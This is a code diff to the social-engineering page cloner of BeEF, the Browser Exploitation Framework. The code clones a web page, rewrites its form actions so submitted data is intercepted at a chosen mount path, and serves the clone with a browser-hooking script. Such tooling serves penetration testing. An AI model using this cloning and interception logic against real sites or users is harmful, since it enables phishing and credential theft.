@@ -27,7 +27,7 @@ module BeEF
           @beef_hook = "http://#{@config.get('beef.http.host')}:#{@config.get('beef.http.port')}#{@config.get('beef.http.hook_file')}"
         end
 
-        def clone_page(url)
+        def clone_page(url, mount)
           print_info "Cloning page at URL #{url}"
           uri = URI(url)
           output = uri.host
@@ -53,7 +53,7 @@ module BeEF
                   end
                   count += 1
                 end
-                line_attrs[count] = "action=\"/#{output}\""
+                line_attrs[count] = "action=\"#{mount}\""
                 mod_form = line_attrs.join(" ")
                 print_info "Form action value changed to / in order to be intercepted."
                 out_file.print mod_form
@@ -72,8 +72,15 @@ module BeEF
 
           # Check if the original URL can be framed
           frameable = is_frameable(url)
-          @http_server.mount("/#{output}", BeEF::Extension::SocialEngineering::Interceptor.new(file_path, url, frameable, @beef_hook))
-          print_info "Mounting cloned page on URL [/#{output}]"
+
+          interceptor = BeEF::Extension::SocialEngineering::Interceptor
+          interceptor.set :file_path, file_path
+          interceptor.set :redirect_to, url
+          interceptor.set :frameable, frameable
+          interceptor.set :beef_hook, @beef_hook
+
+          @http_server.mount("#{mount}", interceptor.new)
+          print_info "Mounting cloned page on URL [#{mount}]"
           @http_server.remap
         end
 
